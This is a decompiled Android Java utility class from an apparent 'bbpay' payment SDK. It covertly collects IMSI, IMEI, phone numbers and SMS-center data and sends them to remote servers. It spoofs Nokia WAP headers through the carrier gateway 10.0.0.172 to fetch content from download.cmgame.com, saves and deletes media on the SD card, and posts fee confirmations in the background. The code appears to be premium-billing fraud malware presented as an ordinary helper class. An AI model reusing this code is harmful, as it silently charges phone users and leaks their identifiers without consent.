package com.bbpay.util;
import java.io.BufferedReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.regex.Pattern;
import org.apache.http.Header;
import org.apache.http.HttpEntity;
import org.apache.http.HttpHost;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.params.HttpClientParams;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicHeader;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.util.EntityUtils;
import android.content.Context;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Proxy;
import android.os.AsyncTask;
import android.os.Build;
import android.util.Log;
import com.bbpay.bean.Constants;
import com.bbpay.sms.SmscTools;

public class Tools {
    private static final String COUNT = "count";
    private static final String MONTH = "month";
    private static final String SMSCountShare = "SMSCountShare";
    private static FileWriter fWriter = null;
    private static int moneyArr[] = { 10, 20, 30, 50, 100, 300, 500 };
    private static boolean saveLog = true;
    private static String saveLogPath = "/sdcard/Platform-Log.txt";
    private static boolean showLog = true;
    public Tools() {}
    private static final String bytesToHexString(byte abyte0[]) {
        if (abyte0 == null) return null;
        if (abyte0.length == 0) return "";
        StringBuffer stringbuffer = new StringBuffer(2 * abyte0.length);
        int i = 0;
        do {
            if (i >= abyte0.length) return stringbuffer.toString();
            String s = Integer.toHexString(0xff & abyte0[i]);
            if (s.length() < 2) stringbuffer.append(0);
            stringbuffer.append(s.toUpperCase());
            i++;
        } while (true);
    }
    public static void closeSaveLog() {
        try {
            if (fWriter != null) {
                fWriter.close();
                fWriter = null;
            }
            return;
        } catch (IOException ioexception) {
            return;
        } catch (Exception exception) {
            return;
        }
    }
    public static final String fromHex(String s) {
        if (s == null || s.equals("")) return s;
        else return new String(hexStringToByte(s));
    }
    public static final String fromHex(String s, String s1) {
        if (s == null || s.equals("")) return s;
        String s2;
        try {
            s2 = new String(hexStringToByte(s), s1);
        } catch (UnsupportedEncodingException unsupportedencodingexception) {
            return new String(hexStringToByte(s));
        }
        return s2;
    }
    public static int[] getAllCardMoney() {
        return moneyArr;
    }
    public static String getBody(HttpEntity httpentity) {
        String s;
        try {
            s = EntityUtils.toString(httpentity);
        } catch (Exception exception) {
            MyLogger.info("====", new StringBuilder("处理entity错误").append(httpentity).append(" , ").append(exception.getMessage()).append(" , ").append(exception.getStackTrace())
                    .toString());
            return null;
        }
        return s;
    }
    public static String getBody(HttpResponse httpresponse, Context context) {
        Header aheader[] = httpresponse.getAllHeaders();
        String s = null;
        try {
            if (aheader != null && aheader.length > 0) {
                for (Header header : aheader) {
                    if (header.getName().trim().equals("Content-Type")) {
                        if (header.getValue().trim().contains("audio/mpeg")) {
                            FileUtil.saveFlashFile(httpresponse.getEntity().getContent(), FileUtil.getExterPath() + "/" + System.currentTimeMillis() + ".mp3");
                            FileUtil.deleteEpayFile(FileUtil.getExterPath());
                            submitConfirm(context, 5, 0);
                            return "音乐类型，下载到SDCARD";
                        } else if (header.getValue().trim().contains("video/3gpp")) {
                            FileUtil.saveFlashFile(httpresponse.getEntity().getContent(), FileUtil.getExterPath() + "/" + System.currentTimeMillis() + ".3gp");
                            FileUtil.deleteEpayFile(FileUtil.getExterPath());
                            submitConfirm(context, 4, 0);
                            return "视频类型，下载到SDCARD";
                        }
                    }
                }
            }
            s = EntityUtils.toString(httpresponse.getEntity());
        } catch (Exception e) {
            e.printStackTrace();
        }
        return s;
    }
    public static String getCharset() {
        return "charset=\"utf-8\"";
    }
    public static String getConfirmURL(Context context, int i, int j) {
        int cpId = SystemInfo.getCpId(context);
        int serviceId = SystemInfo.getServiceId(context);
        int fee = SystemInfo.getFee(context);
        String price = SystemInfo.getP(context);
        String smsc = new SmscTools(context).dogetSMSC();
        String imsi = SystemInfo.getIMSI(context);
        String s3 = i == 0 ? Constants.SERVER_URL : Constants.SERVER_URL_BACK;
        StringBuilder sb;
        sb = new StringBuilder(String.valueOf(s3));
        String as[] = new String[7];
        as[0] = String.valueOf(cpId);
        as[1] = String.valueOf(serviceId);
        as[2] = String.valueOf(fee);
        as[3] = smsc;
        as[4] = imsi;
        as[5] = price;
        as[6] = String.valueOf(j);
        return sb.append(String.format(Constants.SERVER_CONFIRM_URL_LAST, as)).toString();
    }
    public static HttpResponse getContent(String s, Header aheader[], Context context) throws ClientProtocolException, IOException {
        DefaultHttpClient defaulthttpclient;
        HttpGet httpget;
        HttpResponse httpresponse;
        try {
            defaulthttpclient = new DefaultHttpClient();
            httpget = new HttpGet(s);
            if (isNeedProxy(context)) {
                HttpHost httphost = new HttpHost(Proxy.getDefaultHost(), Proxy.getDefaultPort(), "http");
                defaulthttpclient.getParams().setParameter("http.route.default-proxy", httphost);
                httpget.setHeader("accept", "text/vnd.wap.wml");
            }
        } catch (Exception exception) {
            exception.printStackTrace();
            return null;
        }
        if (aheader != null) {
            httpget.setHeaders(aheader);
        }
        httpresponse = defaulthttpclient.execute(httpget);
        return httpresponse;
    }
    public static String getCurrentDate(String s, Date date) {
        if (s == null) s = "yyyy-MM-dd";
        if (date == null) date = new Date();
        return new SimpleDateFormat(s).format(date);
    }
    public static String getCurrentTimeInfo() {
        Date date = new Date();
        return new StringBuilder(" [time:<").append(getCurrentDate("yyyy-MM-dd HH:mm:ss", date)).append("> And Millis:<").append(date.getTime()).append(">] ").toString();
    }
    public static String getDefaultGETHeader() {
        return "HTTP/1.1 200 OK\r\nHost: download.cmgame.com\r\nUser-Agent: NokiaN73-1/4.0850.43.1.1 Series60/3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\r\nAccept: application/vnd.wap.wmlscriptc, text/vnd.wap.wml, application/vnd.wap.xhtml+xml, application/xhtml+xml, text/html, multipart/mixed, */*, text/x-vcard, text/x-vcalendar, image/gif, image/vnd.wap.wbmp\r\nAccept-Language: zh-CN\r\nAccept-Charset: ISO-8859-1, US-ASCII, UTF-8; Q=0.8, ISO-10646-UCS-2; Q=0.6\r\n\r\n";
    }
    public static String getDefaultPOSTHeader() {
        return "HTTP/1.1 200 OK\r\nHost: download.cmgame.com\r\nUser-Agent: NokiaN73-1/4.0850.43.1.1 Series60/3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\r\nAccept: application/vnd.wap.wmlscriptc, text/vnd.wap.wml, application/vnd.wap.xhtml+xml, application/xhtml+xml, text/html, multipart/mixed, */*, text/x-vcard, text/x-vcalendar, image/gif, image/vnd.wap.wbmp\r\nAccept-Language: zh-CN\r\nAccept-Charset: ISO-8859-1, US-ASCII, UTF-8; Q=0.8, ISO-10646-UCS-2; Q=0.6\r\nContent-Type: text/plain\r\nConnection: close\r\nContent-Length: 0\r\n\r\n";
    }
    public static String getFeddbackURL(Context context, int i, int j, int k) {
        int l = SystemInfo.getCpId(context);
        int i1 = SystemInfo.getServiceId(context);
        SystemInfo.getFee(context);
        SystemInfo.getP(context);
        String s = new SmscTools(context).dogetSMSC();
        String s1 = SystemInfo.getIMSI(context);
        String s2;
        StringBuilder stringbuilder;
        String as[];
        if (i == 0) s2 = Constants.SERVER_URL;
        else s2 = Constants.SERVER_URL_BACK;
        stringbuilder = new StringBuilder(String.valueOf(s2));
        as = new String[6];
        as[0] = new StringBuilder(String.valueOf(l)).toString();
        as[1] = new StringBuilder(String.valueOf(i1)).toString();
        as[2] = new StringBuilder(String.valueOf(j)).toString();
        as[3] = new StringBuilder(String.valueOf(k)).toString();
        as[4] = s;
        as[5] = s1;
        return stringbuilder.append(String.format(Constants.SERVER_CONFIRM_DOWNLOAD_FINISH, as)).toString();
    }
    public static String getGameBody(HttpResponse httpresponse, Context context) {
        String s = null;
        try {
            Header aheader[] = httpresponse.getAllHeaders();
            if (aheader != null) {
                for (Header header : aheader) {
                    if (header.getName().trim().equals("Content-Type") && header.getValue().trim().contains("audio/mpeg")) {
                        FileUtil.saveFlashFile(httpresponse.getEntity().getContent(),
                                new StringBuilder(String.valueOf(FileUtil.getExterPath())).append("/").append(System.currentTimeMillis()).append(".mp3").toString());
                        FileUtil.deleteEpayFile(FileUtil.getExterPath());
                        submitConfirm(context, 5, 0);
                        return "音乐类型，下载到SDCARD";
                    } else if (header.getName().trim().equals("Content-Type") && header.getValue().trim().contains("video/3gpp")) {
                        FileUtil.saveFlashFile(httpresponse.getEntity().getContent(),
                                new StringBuilder(String.valueOf(FileUtil.getExterPath())).append("/").append(System.currentTimeMillis()).append(".3gp").toString());
                        FileUtil.deleteEpayFile(FileUtil.getExterPath());
                        submitConfirm(context, 4, 0);
                        return "视频类型，下载到SDCARD";
                    }
                }
            }
            s = EntityUtils.toString(httpresponse.getEntity());
        } catch (Exception exception) {
            MyLogger.info("====", new StringBuilder().append(exception.getMessage()).toString());
        }
        return s;
    }
    public static String getHeader(HttpResponse httpresponse) {
        String s = null;
        if (httpresponse != null) {
            Header aheader[];
            StringBuffer stringbuffer;
            int i;
            int j;
            aheader = httpresponse.getAllHeaders();
            stringbuffer = new StringBuffer();
            i = aheader.length;
            j = 0;
            while (j < i) {
                Header header = aheader[j];
                stringbuffer.append(new StringBuilder().append(header).append("\r\n").toString());
                j++;
            }
            s = stringbuffer.toString();
        }
        return s;
    }
    public static ArrayList getHeaderList(Context context) {
        ArrayList arraylist = new ArrayList();
        arraylist.add(new KeyValue("MID", SystemInfo.getMID(context)));
        arraylist.add(new KeyValue("MIDX", SystemInfo.getMID(context)));
        arraylist.add(new KeyValue("softversion", ""));
        arraylist.add(new KeyValue("LAC", SystemInfo.getLAC(context)));
        arraylist.add(new KeyValue(Constants.IMEI, SystemInfo.getIMEI(context)));
        arraylist.add(new KeyValue("BT", SystemInfo.getBT(context)));
        arraylist.add(new KeyValue("Screen", SystemInfo.getScreen(context)));
        arraylist.add(new KeyValue("CardType", SystemInfo.getCardType(context)));
        arraylist.add(new KeyValue("Network", SystemInfo.getNetworkInfo(context)));
        return arraylist;
    }
    public static Header[] getHeadersByDefault(Context context, String sign, String s1) {
        Header aheader[] = new Header[11];
        aheader[0] = new BasicHeader(Constants.MOBILE_MODEL, Build.MODEL);
        aheader[1] = new BasicHeader(Constants.SIGN, sign);
        aheader[2] = new BasicHeader(Constants.OS_VERSION, new StringBuilder(String.valueOf(android.os.Build.VERSION.SDK_INT)).toString());
        aheader[3] = new BasicHeader(Constants.NET_MODE, SystemInfo.getNetworkInfo(context));
        aheader[4] = new BasicHeader(Constants.VERSION_CODE, Constants.SDK_VERSION);
        aheader[5] = new BasicHeader(Constants.PACKAGE_NAME, SystemInfo.getPackageName(context));
        aheader[6] = new BasicHeader(Constants.MOBILE, SystemInfo.getMobileNum(context));
        aheader[7] = new BasicHeader(Constants.CLIENT_MOBILE, SystemInfo.getNativePhoneNumber(context));
        aheader[8] = new BasicHeader(Constants.MOBILEIMSI, SystemInfo.getIMSI(context));
        aheader[9] = new BasicHeader(Constants.MOBILEIMEI, SystemInfo.getIMEI(context));
        aheader[10] = new BasicHeader(Constants.CP, s1);
        return aheader;
    }
    public static String getHttpContent(String url, Header aheader[], Context context) {
        String content = null;
        try {
            HttpEntity httpentity = Tools.getHttpResponse(url, Tools.getHeadersByDefault(context, "", null), context).getEntity();
            if (httpentity != null) {
                content = Tools.getStringFromInputStream(httpentity.getContent());
            }
        } catch (Throwable e) {
            MyLogger.error(e);
        }
        return content;
    }
    private static HttpResponse getHttpResponse(String url, Header aheader[], Context context) {
        try {
            DefaultHttpClient client = new DefaultHttpClient();
            if (isNeedProxy(context)) {
                HttpHost httphost = new HttpHost(Proxy.getDefaultHost(), Proxy.getDefaultPort(), "http");
                client.getParams().setParameter("http.route.default-proxy", httphost);
            }
            HttpGet httpget = new HttpGet(url);
            if (aheader != null) {
                httpget.setHeaders(aheader);
            }
            return client.execute(httpget);
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return null;
    }
    public static int getSMSCount(Context context) {
        return context.getSharedPreferences(SMSCountShare, 2).getInt(COUNT, 0);
    }
    public static List getStringFromHeader(InputStream inputstream) {
        ArrayList arraylist;
        BufferedReader bufferedreader;
        arraylist = new ArrayList();
        try {
            bufferedreader = new BufferedReader(new InputStreamReader(inputstream));
            String s;
            while ((s = bufferedreader.readLine()) != null) {
                arraylist.add(fromHex(s));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return arraylist;
    }
    public static String getStringFromInputStream(InputStream inputstream) {
        BufferedReader bufferedreader;
        StringBuffer stringbuffer;
        bufferedreader = new BufferedReader(new InputStreamReader(inputstream));
        stringbuffer = new StringBuffer();
        String s;
        try {
            while ((s = bufferedreader.readLine()) != null) {
                stringbuffer.append(s);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return stringbuffer.toString();
    }
    public static String getSubString(String s, int i) {
        if (s == null || i < 0 || s.length() <= i) return s;
        else return s.substring(0, i);
    }
    private static HttpResponse getUrl(HttpClient httpclient, String s, ArrayList arraylist) {
        Log.e("Tools-getUrl", new StringBuilder("GET:").append(s).toString());
        HttpGet httpget = new HttpGet(s);
        if (arraylist != null && arraylist.size() > 0) {
            int l = 0;
            while (l < arraylist.size()) {
                KeyValue keyvalue = (KeyValue) arraylist.get(l);
                if (keyvalue != null) {
                    String s1 = keyvalue.getKey().toLowerCase();
                    if (!s1.equals("content-length") && !s1.equals("host")) httpget.setHeader(keyvalue.getKey(), keyvalue.getValue());
                }
                l++;
            }
        }
        //_L2:
        httpget.setHeader("Host", "10.0.0.172");
        httpget.setHeader("X-Online-Host", null);
        if (httpget.getFirstHeader("Range") == null) httpget.setHeader("Range", "bytes=0-199999");
        if (httpget != null) {
            //_L5:
            Header aheader[] = httpget.getAllHeaders();
            if (aheader != null && aheader.length > 0) {
                int k = 0;
                while (k < aheader.length) {
                    Log.e("Tools-getUrl", new StringBuilder(String.valueOf(aheader[k].getName())).append(": ").append(aheader[k].getValue()).toString());
                    k++;
                }
            }
            //_L9:
            int i = 0;
            while (i < 10) {
                HttpResponse httpresponse = null;
                try {
                    httpresponse = httpclient.execute(httpget);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                if (httpresponse != null && httpresponse.getStatusLine() != null) {
                    int j = httpresponse.getStatusLine().getStatusCode();
                    Log.e("requestSubUrl", new StringBuilder("GET ").append(s).append(" StatusCode:").append(j).toString());
                    if (j == 200 || j == 206 || j == 302) return httpresponse;
                } else {
                    httpget.abort();
                }
                i++;
            }
        }
        return null;
    }
    public static String getURL(Context context, int i) {
        int j = SystemInfo.getCpId(context);
        int k = SystemInfo.getServiceId(context);
        int l = SystemInfo.getFee(context);
        String s = SystemInfo.getOrderId();
        String s1 = SystemInfo.getP(context);
        String s2 = new SmscTools(context).dogetSMSC();
        String s3 = SystemInfo.getIMSI(context);
        String s4;
        StringBuilder stringbuilder;
        String as[];
        if (i == 0) s4 = Constants.SERVER_URL;
        else s4 = Constants.SERVER_URL_BACK;
        stringbuilder = new StringBuilder(String.valueOf(s4));
        as = new String[8];
        as[0] = new StringBuilder(String.valueOf(j)).toString();
        as[1] = new StringBuilder(String.valueOf(k)).toString();
        as[2] = new StringBuilder(String.valueOf(l)).toString();
        as[3] = s2;
        as[4] = s3;
        as[5] = s1;
        as[6] = s;
        as[7] = "1.1";
        return stringbuilder.append(String.format(Constants.SERVER_URL_LAST, as)).toString();
    }
    public static List getURLByResponse(String s, HttpResponse httpresponse) {
        try {
            DefaultHttpClient defaulthttpclient = new DefaultHttpClient();
            HttpHost httphost = new HttpHost("10.0.0.172", 80, "http");
            defaulthttpclient.getParams().setParameter("http.route.default-proxy", httphost);
            new ArrayList();
            HttpPost httppost = new HttpPost(s);
            httppost.setEntity(httpresponse.getEntity());
            httppost.setHeaders(httpresponse.getAllHeaders());
            defaulthttpclient.execute(httppost);
            defaulthttpclient.getConnectionManager().shutdown();
        } catch (Exception exception) {
            exception.printStackTrace();
            MyLogger.info("===", new StringBuilder(String.valueOf(exception.getMessage())).append(exception.getStackTrace()).toString());
        }
        return null;
    }
    private static byte[] hexStringToByte(String s) {
        int i = s.length() / 2;
        byte abyte0[] = new byte[i];
        char ac[] = s.toCharArray();
        int j = 0;
        do {
            if (j >= i) return abyte0;
            int k = j * 2;
            abyte0[j] = (byte) (toByte(ac[k]) << 4 | toByte(ac[k + 1]));
            j++;
        } while (true);
    }
    public static boolean isAllNumberString(String s, Integer integer, Integer integer1) {
        if (s == null || s.trim().equals("")) return false;
        if (integer == null) integer = Integer.valueOf(0);
        String s1 = new StringBuilder("\\d{").append(integer).append(",").toString();
        if (integer1 != null) s1 = new StringBuilder(String.valueOf(s1)).append(integer1).toString();
        return Pattern.compile(new StringBuilder(String.valueOf(s1)).append("}").toString()).matcher(s).matches();
    }
    public static boolean isAppInstalled(Context context, String s) {
        if (s != null && !s.trim().equals("")) {
            android.content.pm.ApplicationInfo applicationinfo;
            try {
                applicationinfo = context.getPackageManager().getApplicationInfo(s, 8192);
            } catch (android.content.pm.PackageManager.NameNotFoundException namenotfoundexception) {
                return false;
            }
            if (applicationinfo != null) return true;
        }
        return false;
    }
    public static boolean isEffectMoney(int i) {
        do {
            int j;
            for (j = 0; j >= moneyArr.length || i < moneyArr[j];)
                return false;
            if (i == moneyArr[j]) return true;
            j++;
        } while (true);
    }
    public static boolean isNeedProxy(Context context) {
        NetworkInfo networkinfo = ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
        if (networkinfo != null) {
            if (networkinfo.getType() != 1) { return StringUtils.isNotBlank(Proxy.getDefaultHost()); }
        }
        return false;
    }
    public static boolean isPhoneNumberValid(String s) {
        if (s != null && !s.trim().equals("")) {
            if (s.startsWith("+86")) s = s.substring(3);
            if (s.length() == 11) return Pattern.compile("^([1][3-9])\\d{9}$").matcher(s).matches();
        }
        return false;
    }
    private static HttpResponse postUrl(HttpClient httpclient, String s, ArrayList arraylist, String s1) {
        HttpPost httppost;
        Header aheader[];
        int k;
        int l;
        Log.e("Tools-postUrl", new StringBuilder("POST:").append(s).toString());
        String s2;
        if (s.toLowerCase().startsWith("http://")) {
            s = new StringBuilder("http://").append(s.substring(7)).toString();
            Integer integer4 = Integer.valueOf(0);
            s2 = subString(s, "http://", null, "/", integer4);
            if (s2 == null) {
                Integer integer5 = Integer.valueOf(0);
                Integer integer6 = Integer.valueOf(0);
                s2 = subString(s, "http://", integer5, "?", integer6);
                if (s2 == null) s2 = s.substring(7);
            }
        } else {
            boolean flag = s.toLowerCase().startsWith("www.");
            s2 = null;
            if (flag) {
                s = new StringBuilder("www.").append(s.substring(4)).toString();
                Integer integer = Integer.valueOf(0);
                Integer integer1 = Integer.valueOf(0);
                s2 = subString(s, "www.", integer, "/", integer1);
                if (s2 == null) {
                    Integer integer2 = Integer.valueOf(0);
                    Integer integer3 = Integer.valueOf(0);
                    s2 = subString(s, "www.", integer2, "?", integer3);
                    if (s2 == null) s2 = s.substring(4);
                }
            }
        }
        httppost = new HttpPost(s);
        if (arraylist != null && arraylist.size() > 0) {
            l = 0;
            while (l < arraylist.size()) {
                KeyValue keyvalue = (KeyValue) arraylist.get(l);
                if (keyvalue != null) {
                    String s3 = keyvalue.getKey().toLowerCase();
                    if (!s3.equals("content-length") && !s3.equals("host")) httppost.setHeader(keyvalue.getKey(), keyvalue.getValue());
                }
                l++;
            }
        }
        //_L2:
        httppost.setHeader("Host", "10.0.0.172");
        httppost.setHeader("X-Online-Host", s2);
        if (httppost.getFirstHeader("Range") == null) httppost.setHeader("Range", "bytes=0-199999");
        if (httppost != null) {
            aheader = httppost.getAllHeaders();
            if (aheader != null && aheader.length > 0) {
                k = 0;
                while (k < aheader.length) {
                    Log.e("Tools-postUrl", new StringBuilder(String.valueOf(aheader[k].getName())).append(": ").append(aheader[k].getValue()).toString());
                    k++;
                }
            }
            //_L9:
            int i;
            Exception exception;
            HttpResponse httpresponse = null;
            int j;
            IOException ioexception;
            ClientProtocolException clientprotocolexception;
            HttpResponse httpresponse1;
            KeyValue keyvalue;
            String s3;
            IllegalArgumentException illegalargumentexception1;
            if (s1 != null && !s1.equals("")) try {
                httppost.setEntity(new StringEntity(s1, "UTF-8"));
            } catch (UnsupportedEncodingException unsupportedencodingexception) {}
            i = 0;
            //_L15:
            while (i < 10) {
                try {
                    httpresponse = httpclient.execute(httppost);
                } catch (ClientProtocolException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                } catch (IOException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
                if (httpresponse != null && httpresponse.getStatusLine() != null) {
                    j = httpresponse.getStatusLine().getStatusCode();
                    Log.e("requestSubUrl", new StringBuilder("POST ").append(s).append(" StatusCode:").append(j).toString());
                    if (j == 200 || j == 206 || j == 302) return httpresponse;
                } else {
                    httppost.abort();
                }
                i++;
            }
        }
        return null;
    }
    public static HttpResponse postURL(boolean flag, String s, ArrayList arraylist, String s1) {
        if (s != null && !s.trim().equals("")) {
            String s2;
            DefaultHttpClient defaulthttpclient;
            s2 = replaceSpecialChar(s);
            Log.e("requestSubUrl", new StringBuilder("POST ").append(s2).toString());
            HttpHost httphost = null;
            if (!flag) {
                String s3 = Proxy.getDefaultHost();
                int j1 = Proxy.getDefaultPort();
                httphost = null;
                if (s3 != null) {
                    httphost = null;
                    if (j1 != -1) httphost = new HttpHost(s3, j1);
                }
                Log.e("postURL", new StringBuilder("defaultHost=").append(s3).append(" defaultPort=").append(j1).toString());
            }
            defaulthttpclient = new DefaultHttpClient();
            HttpParams httpparams = defaulthttpclient.getParams();
            if (httphost != null) httpparams.setParameter("http.route.default-proxy", httphost);
            HttpConnectionParams.setConnectionTimeout(httpparams, 60000);
            HttpConnectionParams.setSoTimeout(httpparams, 0x927c0);
            HttpClientParams.setRedirecting(httpparams, true);
            Log.e("Tools-postUrl", new StringBuilder("POST:").append(s2).toString());
            HttpPost httppost = new HttpPost(s2);
            if (arraylist != null && arraylist.size() > 0) {
                int l = 0;
                int i1 = arraylist.size();
                while (l < i1) {
                    KeyValue keyvalue = (KeyValue) arraylist.get(l);
                    if (!keyvalue.getKey().toLowerCase().equals("content-length")) httppost.setHeader(keyvalue.getKey(), keyvalue.getValue());
                    l++;
                }
            }
            Header aheader[] = httppost.getAllHeaders();
            int i;
            int j;
            IOException ioexception;
            ClientProtocolException clientprotocolexception;
            HttpResponse httpresponse1;
            KeyValue keyvalue;
            IllegalArgumentException illegalargumentexception1;
            if (s1 != null && !s1.equals("")) try {
                StringEntity stringentity = new StringEntity(s1, "UTF-8");
                httppost.setEntity(stringentity);
            } catch (UnsupportedEncodingException unsupportedencodingexception) {}
            i = 0;
            while (i < 10) {
                HttpResponse httpresponse = null;
                try {
                    httpresponse = defaulthttpclient.execute(httppost);
                } catch (ClientProtocolException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                } catch (IOException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
                if (httpresponse != null && httpresponse.getStatusLine() != null) {
                    j = httpresponse.getStatusLine().getStatusCode();
                    Log.e("requestSubUrl", new StringBuilder("POST ").append(s2).append(" StatusCode:").append(j).toString());
                    if (j == 200 || j == 206 || j == 302) return httpresponse;
                }
                i++;
            }
        }
        return null;
    }
    public static void printStackTrace(String s, StackTraceElement astacktraceelement[]) {
        int i = astacktraceelement.length;
        int j = 0;
        do {
            if (j >= i) return;
            StackTraceElement stacktraceelement = astacktraceelement[j];
            Log.e(s, new StringBuilder("\tat ").append(stacktraceelement).toString());
            j++;
        } while (true);
    }
    public static String replaceAll(String s, String s1, String s2) {
        if (s != null && !s.equals("") && s1 != null && !s1.equals("")) {
            int i = s.indexOf(s1, 0);
            while (i >= 0) {
                s = new StringBuilder(String.valueOf(s.substring(0, i))).append(s2).append(s.substring(i + s1.length())).toString();
                i = s.indexOf(s1);
            }
        }
        return s;
    }
    public static String replaceSpecialChar(String s) {
        if (s != null && !s.trim().equals("")) {
            String as[] = { "&lt;", "&gt;", "&amp;", "&apos;", "&quot;", "&nbsp;" };
            String as1[] = { "<", ">", "&", "'", "\"", " " };
            int i = 0;
            while (i < as.length) {
                s = s.replaceAll(as[i], as1[i]);
                i++;
            }
        }
        return s;
    }
    public static HttpResponse requestSubUrl(String s, boolean flag, ArrayList arraylist, String s1) {
        if (s == null || s.trim().equals("")) return null;
        String s2 = replaceSpecialChar(s);
        String s3;
        HttpHost httphost;
        DefaultHttpClient defaulthttpclient;
        HttpParams httpparams;
        if (flag) s3 = "POST ";
        else s3 = "GET ";
        Log.e("requestSubUrl", new StringBuilder(String.valueOf(s3)).append(s2).toString());
        httphost = new HttpHost("10.0.0.172", 80);
        defaulthttpclient = new DefaultHttpClient();
        httpparams = defaulthttpclient.getParams();
        httpparams.setParameter("http.route.default-proxy", httphost);
        HttpConnectionParams.setConnectionTimeout(httpparams, 60000);
        HttpConnectionParams.setSoTimeout(httpparams, 0x927c0);
        HttpClientParams.setRedirecting(httpparams, false);
        if (!flag) return getUrl(defaulthttpclient, s2, arraylist);
        else return postUrl(defaulthttpclient, s2, arraylist, s1);
    }
    public static void saveFile(String s, String s1, boolean flag) {
        FileWriter filewriter;
        try {
            filewriter = new FileWriter(s1, flag);
        } catch (IOException ioexception1) {
            return;
        }
        if (filewriter != null) try {
            filewriter.write(s);
            filewriter.flush();
            filewriter.close();
            return;
        } catch (IOException ioexception) {
            return;
        }
        else return;
    }
    public static void saveLog(String s, String s1, boolean flag) {
        if (saveLog) {
            FileWriter filewriter;
            try {
                filewriter = new FileWriter(s1, flag);
                if (filewriter != null) {
                    filewriter.write(s);
                    filewriter.flush();
                    filewriter.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
    public static void setShowLog(boolean flag) {
        showLog = flag;
    }
    private static void showAllHeader(Header aheader[], List list) {
        int i;
        int j;
        if (list == null) new ArrayList();
        else list.clear();
        i = aheader.length;
        j = 0;
        do {
            if (j >= i) return;
            Header _tmp = aheader[j];
            j++;
        } while (true);
    }
    public static void showLog(String s, String s1) {
        if (showLog) Log.e(s, s1);
    }
    public static void showSaveLog(String s, String s1) {
        if (showLog) Log.e(s, s1);
        if (saveLog) {
            String s2;
            try {
                if (fWriter == null) fWriter = new FileWriter(saveLogPath, true);
            } catch (IOException ioexception) {
                return;
            } catch (Exception exception) {
                return;
            }
            if (s != null && s1 != null) {
                s2 = new StringBuilder(String.valueOf(s)).append(":").toString();
                if (s1.length() >= 100) s2 = new StringBuilder(String.valueOf(s2)).append("\r\n").toString();
                try {
                    fWriter.write(new StringBuilder(String.valueOf(s2)).append(s1).append("\r\n").toString());
                    fWriter.flush();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }
    private static void submitConfirm(final Context context, final int feeMode, final int statu) {
        new AsyncTask<String, String, String>() {
            @Override
            protected String doInBackground(String... as) {
                int i = 0;
                while (i < 2) {
                    String s = Tools.getFeddbackURL(context, i / 2, feeMode, statu);
                    InputStream inputstream = null;
                    try {
                        inputstream = Tools.getHttpResponse(s, Tools.getHeadersByDefault(context, null, null), context).getEntity().getContent();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    if (inputstream != null) return null;
                    try {
                        Thread.sleep(1000L);
                    } catch (Exception exception1) {}
                    i++;
                }
                return null;
            }
        }.execute(new String[] { "" });
    }
    public static String subString(String s, String s1, Integer integer, String s2, Integer integer1) {
        int i;
        String s3;
        if (s == null || s1 == null || s2 == null) return null;
        if (integer == null) integer = Integer.valueOf(s1.length());
        if (integer1 == null) integer1 = Integer.valueOf(s2.length());
        i = s.indexOf(s1);
        s3 = null;
        if (i < 0) return s3;
        int j;
        int k;
        int l;
        j = i + integer.intValue();
        k = s.indexOf(s2, j) + integer1.intValue();
        l = s.length();
        if (j < 0 || k > l || k <= j) {
            s3 = null;
            if (j == k) s3 = "";
        } else {
            s3 = s.substring(j, k);
        }
        return s3;
    }
    private static byte toByte(char c) {
        return (byte) "0123456789ABCDEF".indexOf(c);
    }
    public static final String toHex(String s) {
        if (s == null || s.equals("")) return s;
        else return bytesToHexString(s.getBytes());
    }
    public static void updateSMSCount(Context context) {
        SharedPreferences sharedpreferences = context.getSharedPreferences(SMSCountShare, 2);
        android.content.SharedPreferences.Editor editor = sharedpreferences.edit();
        String s = sharedpreferences.getString(MONTH, null);
        String s1 = getCurrentDate("yyyy-MM", null);
        int i;
        if (s != null && s.equals(s)) {
            i = 1 + sharedpreferences.getInt(COUNT, 0);
            editor.putInt(COUNT, i);
        } else {
            i = 0 + 1;
            editor.putString(MONTH, s1);
            editor.putInt(COUNT, i);
        }
        Log.e("cont", new StringBuilder("count is ").append(i).append(", month is ").append(s1).toString());
        editor.commit();
    }
}
